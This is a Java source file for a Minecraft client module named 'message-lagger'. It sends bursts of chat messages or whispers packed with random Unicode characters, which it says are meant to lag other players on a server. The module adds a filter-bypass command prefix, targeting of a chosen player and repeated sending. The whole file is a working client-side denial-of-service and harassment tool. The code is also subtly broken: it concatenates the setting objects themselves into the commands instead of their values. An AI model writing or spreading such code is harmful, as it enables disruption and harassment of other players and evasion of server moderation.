/*
 * This file is part of the Meteor Client distribution (https://github.com/MeteorDevelopment/meteor-client).
 * Copyright (c) Meteor Development.
 */

package meteordevelopment.meteorclient.systems.modules.Dark;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.AbstractClientPlayerEntity;
import net.minecraft.entity.player.PlayerEntity;

import java.util.List;
import java.util.Random;

public class MessageLagger extends Module {

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<String> bc = sgGeneral.add(new StringSetting.Builder().name("Command").description("Bypass Command").defaultValue("/skill").build());

    private final Setting<Integer> messageLength = sgGeneral.add(new IntSetting.Builder()
        .name("message-length")
        .description("The length of the message.")
        .defaultValue(200)
        .min(1)
        .sliderMin(1)
        .sliderMax(1000)
        .build());

    private final Setting<Boolean> keepSending = sgGeneral.add(new BoolSetting.Builder()
        .name("keep-sending")
        .description("Keeps sending the lag messages repeatedly.")
        .defaultValue(false)
        .build());

    private final Setting<Integer> delay = sgGeneral.add(new IntSetting.Builder()
        .name("delay")
        .description("The delay between lag messages in ticks.")
        .defaultValue(100)
        .min(0)
        .sliderMax(1000)
        .visible(keepSending::get)
        .build());

    private final Setting<Boolean> whisper = sgGeneral.add(new BoolSetting.Builder()
        .name("whisper")
        .description("Whispers the lag message to a random person on the server.")
        .defaultValue(false)
        .build());
    private final Setting<String> wc = sgGeneral.add(new StringSetting.Builder()
            .name("Whisper Command")
            .description("Whisper Command")
            .defaultValue("/msg")
            .visible(whisper::get)
            .build());
    private final Setting<String> wp = sgGeneral.add(new StringSetting.Builder()
        .name("Whisper player")
        .description("Player to Whisper to")
        .defaultValue("Notch")
        .visible(whisper::get)
        .build());

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build());

    public MessageLagger() {
        super(Categories.Dark, "message-lagger", "Sends dense messages that lag other players on the server.");
    }

    private int timer;

    @Override
    public void onActivate() {
        if (Utils.canUpdate() && !keepSending.get()) {
            if (!whisper.get()) {
                sendLagMessage();
            }
            else {
                sendLagWhisper();
            }
            toggle();
        }
        if (keepSending.get()) timer = delay.get();
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (timer <= 0) {
            if (Utils.canUpdate() && keepSending.get()) {
                if (!whisper.get()) {
                    sendLagMessage();
                }
                else {
                    sendLagWhisper();
                }
            }
            timer = delay.get();
        }
        else {
            timer--;
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }

    private void sendLagMessage() {
        for (int i = 0; i < 20; i++) {
            ChatUtils.sendPlayerMsg(bc + " " + generateLagMessage());
        }
    }

    private void sendLagWhisper() {
        String message = generateLagMessage();

        ChatUtils.sendPlayerMsg(wc + " " + wp + " " + message);
    }

    private String generateLagMessage() {
        String message = " ";
        for (int i = 0; i < messageLength.get(); i++) {
            message += (char) (Math.floor(Math.random() * 0x9000) + 0x800);
        }
        return message;
    }
}
